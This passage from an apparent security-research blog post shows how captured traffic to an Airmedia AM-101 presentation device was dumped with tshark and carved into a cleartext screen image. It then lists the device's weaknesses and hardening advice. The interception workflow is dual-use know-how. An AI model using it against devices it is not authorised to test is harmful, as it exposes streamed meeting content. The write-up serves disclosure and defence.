40 00 00 01 55 de 56 53 4d 4b 01 32 41 9a ff d8  @...U.VSMK.2A...
ff e0 00 10 4a 46 49 46 00 01 01 00 00 01 00 01  ....JFIF........
--snip--
00 01 80 00 01 00 01 00 00 00 00 00 00 00 00 00  ................
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00 00 49 42 54 41 49 4c                          ..IBTAIL
</pre>

As I didn't want to stare for hours at hexadecimal, I simply dumped all TCP payload from an identified TCP stream with *tshark*:

<pre>
$ for l in `tshark -r "traffic_capture_201706161332.pcapng" -Y usb -z follow,tcp,raw,9`; do echo $l | xxd -r -p >> /tmp/android.bin; done
</pre>

I ran binwalk on the extracted binary payloads to identify the kind of data being transmitted:

<pre>
$ binwalk android.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
104           0x68            JPEG image data, JFIF standard 1.01
</pre>

Easy win, it seems they simply sends JPEG files in cleartext. Let's use *dd* to carve out the JPEG file:

<pre>
$ dd if=android.bin of=9.jpg skip=104 bs=1
87560+0 records in
87560+0 records out
87560 bytes (88 kB, 86 KiB) copied, 0,0983665 s, 890 kB/s
</pre>

Opening the file confirmed my assumption as I was looking at my Android device screen.


### Wrap-up

If we combine the broadcast discovery script with our custom fingerprinting rules and the association script, we can identify all devices running in the same subnet than us and reliably identify proprietary services running on them.

A quick demo with Nmap below:

<script src="https://asciinema.org/a/UZ6onYw1pNMYyesWTgFjmnJQo.js" id="asciicast-UZ6onYw1pNMYyesWTgFjmnJQo" async></script>


## 3. Conclusion

Over the course of this post we learned how to identify network ports exposed by a target device. We then successfully reverse engineered proprietary protocols implemented by Airmedia AM-101 by capturing traffic between legitimate clients and our target device.

We identified the following issues affecting the device:

* **arbitrary streaming of content** (via Airplay or by bruteforcing the PIN protection)
* **weak default credentials** (SNMP community, admin and moderator passwords on web interface)
* **plaintext transmission** of PIN code and streamed content

Some recommendations if you deploy this kind of device in your network:

* disable Airplay service
* disable SNMP service or move to SNMP version 3 and set strong credentials
* set strong credentials for admin and moderator users
* disable auto-discovery in software clients
* disable remote view if not required
* update to the latest firmware version of your device
* put them in a dedicated audio/video VLAN with proper firewalling and segregation rules

Hope you learned something along the way :) Nmap service probe rules, Nmap scripts, and custom Python scripts are now available on my Github at [https://github.com/qkaiser/awind-research/](https://github.com/qkaiser/awind-research/).

The next step will be even more fun as we'll dig into **vulnerability research and development**! Keep an eye on this blog, I'll release it on March 27th.


<!-- You can find it at [Man-in-the-conference room - Part IV (Vulnerability Research & Development)]({{site.url}}/pentesting/2018/08/21/awind-device-vrd/). -->
